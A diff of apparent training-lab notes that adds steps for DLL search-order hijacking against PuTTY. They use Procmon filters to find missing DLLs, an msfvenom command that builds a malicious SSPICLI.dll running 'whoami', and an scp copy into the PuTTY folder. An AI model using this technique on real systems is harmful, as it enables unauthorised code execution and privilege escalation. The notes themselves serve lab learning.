@@ -99,19 +99,15 @@ if you hit bash returns you back to user3
 4. xfreerdp /u:student /v:localhost:RHP /dynamic-resolution +clipboard
 take the fingerprint and replace then one below leave localHost
 5. check folder and show hidden .config -> freerdp 
-6.
-7.
-8.
-9.
-10.
-11.
-12.
-13.
-14.
-15.
-16.
-17.
-
+6. procmon -> setup filter 
+  process name contains putty
+  Path contains .dll
+  Result is NAME NOT FOUND
+ look for vulnerable .dll -> all caps starts with S
+ put in same folder as putty
+in linux -> msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+ls to verify
+windows -> scp student@10.50.157.212:212/tmp/SSPICLI.dll C:\Users\student\Documents\putty\SSPICLI.dll
 
 
 
